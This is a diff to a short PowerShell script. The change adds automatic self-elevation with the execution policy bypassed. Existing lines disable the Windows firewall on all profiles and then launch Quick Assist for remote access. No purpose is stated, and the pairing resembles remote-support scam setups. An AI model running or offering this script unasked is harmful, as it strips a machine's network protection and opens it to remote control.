@@ -1,2 +1,17 @@
+# Relaunch elevated if not already elevated
+$isAdmin = ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin)
+{
+    Start-Process powershell.exe `
+        -Verb RunAs `
+        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+
+    exit
+}
+
 Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
+
 Start-Process "ms-quick-assist:"
